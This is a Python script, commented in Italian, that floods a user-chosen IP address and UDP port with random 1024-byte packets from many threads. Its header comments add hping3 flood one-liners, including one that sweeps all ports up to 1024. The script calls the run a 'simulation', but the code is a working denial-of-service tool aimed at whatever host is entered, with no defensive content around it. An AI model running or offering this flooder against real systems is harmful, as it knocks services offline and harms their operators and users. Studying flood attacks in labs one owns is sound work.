# Per confermare il funzionamento, aprire sulla macchina target TASK MANAGER o su Linux "nc -ul -p INSERISCIPORTA" o "sudo tcpdump -i eth0 udp and port INSERISCIPORTA"
# il risultato simile con hping3 si ottiene: sudo hping3 --udp --flood -p INSERISCIPORTA -d 1024 INDIRIZZOIP
# hping3 --udp --flood -p ++1024 INDIRIZZOIP questo invia a tutte le porte fino alla 1024

import socket
import random
import threading
import sys

# Chiede all'utente di inserire i parametri
target_ip = input("Inserisci l'indirizzo IP del target: ")

try:
    target_port = int(input("Inserisci la porta UDP del target: "))
    # Controllo che la porta sia un valore valido
    if not 1 <= target_port <= 65535:
        print("Errore: La porta deve essere un numero intero tra 1 e 65535.")
        sys.exit(1)
except ValueError:
    print("Errore: Inserisci un numero intero valido per la porta.")
    sys.exit(1)

try:
    num_threads = int(input("Inserisci il numero di thread: "))
except ValueError:
    print("Errore: Inserisci un numero intero valido per i thread.")
    sys.exit(1)

# Flag per controllare l'esecuzione dei thread
esecuzione = True

def udp_flood():
    """
    Funzione eseguita da ogni thread per inviare pacchetti UDP.
    """
    # Creazione di un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while esecuzione:
        try:
            # Crea un pacchetto di dati casuali di dimensioni casuali
            packet_size = random.randint(1024, 1024)
            random_data = random._urandom(packet_size)
            
            # Invia il pacchetto UDP usando la porta specificata dall'utente
            sock.sendto(random_data, (target_ip, target_port))
            
        except socket.error as e:
            # In caso di errore, esci dal ciclo del thread
            break
        
    sock.close()

if __name__ == "__main__":
    
    print("-" * 50)
    print(f"Avvio simulazione UDP flood su {target_ip}:{target_port} con {num_threads} thread...")
    print("-" * 50)
    
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=udp_flood)
        thread.start()
        threads.append(thread)

    try:
        # Attende che l'utente interrompa l'esecuzione con Ctrl+C
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n\nSimulazione interrotta dall'utente. Sto terminando i thread...")
        # Imposta il flag a False per fermare i thread
        esecuzione = False
        
        # Aspetta che i thread terminino in modo pulito
        for thread in threads:
            if thread.is_alive():
                thread.join()
        
        print("\nSimulazione terminata.")
        sys.exit(0)